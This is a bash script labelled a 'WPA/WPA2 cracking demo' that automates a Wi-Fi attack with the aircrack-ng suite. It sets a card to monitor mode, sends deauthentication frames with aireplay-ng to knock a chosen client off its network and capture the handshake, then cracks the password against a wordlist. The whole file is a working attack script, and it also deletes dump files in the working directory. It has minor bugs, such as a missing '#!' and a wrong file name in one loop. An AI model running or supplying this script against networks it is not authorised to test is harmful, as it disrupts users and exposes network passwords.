/bin/bash

clear

# Introduction
echo "++++++++++++++++++++++++++++++++++++++"
echo "       WPA/WPA2 cracking demo"
echo "++++++++++++++++++++++++++++++++++++++"
sleep 3

# Getting interfaces that are in monitor mode
FILE=interfaces.txt

if [ -f $FILE ];
then
echo "File $FILE exists."
echo " Removing interfaces file from previous crack."
rm interfaces.txt
else
echo "File $FILE does not exist script will now continue."
fi

airmon-ng | grep mon | awk {'print $1'}>interfaces.txt

# Stop all interfaces in monitor mode
for int in $(cat interfaces);
do
airmon-ng stop $int
done
sleep 5
clear

# List available cards
airmon-ng
echo -n "Please enter wireless card to use:"
read -e CARD
airmon-ng start $CARD
sleep 3

# Clean out old dump files Sart airodump
echo " Cleaning out any old dump files:)"
#rm *.cap
rm *.csv
rm *.kismet.*

# Starting up airdump and wash
xterm -e airodump-ng mon0 &
xterm -e wash -i mon0 -C &
sleep 2
clear

# Get required info from user
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo "+  Please enter the WPA/2 channel, BSSID and output file to use:  +"
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo -n "Please select Channel: "
read -e CHAN
echo -n "Name of output file to be created:"
read -e SESSION
echo -n "Please enter bssid : "
read -e BSSID
sleep 5

# Echo out test info
echo "Channel Number:" $CHAN
echo "Session to be saved:" $SESSION
echo "BSSID to be cracked:" $BSSID
sleep 3

# Close any open TERMs
killall -TERM airodump-ng
killall -TERM wash

# Run airodump and send deaiths
echo " Sending 10 deauths to client pc to capture 4-way handshake"
xterm -e airodump-ng --ignore-negative-one --channel $CHAN -w $SESSION --bssid $BSSID mon0 &
xterm -e aireplay-ng --deauth 10 -a $BSSID mon0 &
sleep 120
clear

# Select .pcap file to crack
echo "List of available dump files:"
num=1
for ls in $(ls -l *.cap | awk {'print $9'});
do
echo "File $((num++)): $ls"
done
echo -n "Select .pcap file to crack:"
read -e FILE

#select a dictionary file to be used in the crack
echo "List of available wordlists:"
for wordlist in $(ls -l /root/wordlists/* | awk {'print $9'});
do
echo "Wordlist $((num++)): $wordlist"
done
echo -n "Please select a wordlist:"
read -e LIST

killall -TERM airodump-ng

# Use password list to crack captured handshake
aircrack-ng $FILE -w $LIST
